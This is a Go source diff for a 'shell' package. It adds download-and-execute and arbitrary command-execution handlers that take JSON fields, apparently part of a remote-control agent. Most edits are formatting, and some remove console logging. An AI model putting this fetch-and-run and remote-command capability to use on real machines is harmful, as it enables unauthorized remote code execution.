@@ -2,7 +2,6 @@ package shell
 
 import (
 	"C/utils"
-	"fmt"
 	"io"
 	"io/ioutil"
 	"net/http"
@@ -11,9 +10,9 @@ import (
 )
 
 type Down struct {
-	Url  string `json:"url"`
-	Path string `json:"path"`
-	IsRun string  `json:"is_run"`
+	Url   string `json:"url"`
+	Path  string `json:"path"`
+	IsRun string `json:"is_run"`
 }
 type Shell struct {
 	Command string `json:"command"`
@@ -23,7 +22,7 @@ type Remark struct {
 	Remark string `json:"remark"`
 }
 
-func (r Remark) ChangeRemark() string{
+func (r Remark) ChangeRemark() string {
 
 	return utils.SetRemarks(r.Remark)
 }
@@ -37,7 +36,7 @@ func (s Shell) ExecuteCmd() string {
 	defer stdout.Close() // 保证关闭输出流
 
 	if err := cmd.Start(); err != nil { // 运行命令
-		fmt.Println(err.Error())
+		//fmt.Println(err.Error())
 		return err.Error()
 
 	}
@@ -47,7 +46,7 @@ func (s Shell) ExecuteCmd() string {
 		return err.Error()
 
 	} else {
-		fmt.Println("execute", string(opBytes))
+		//fmt.Println("execute", string(opBytes))
 		return string(opBytes)
 	}
 }
@@ -72,7 +71,7 @@ func (d Down) Download() string {
 	if err != nil {
 		return err.Error()
 	}
-	if d.IsRun == "yes"{
+	if d.IsRun == "yes" {
 		cmd := exec.Command(d.Path, "")
 		err := cmd.Run()
 		if err != nil {
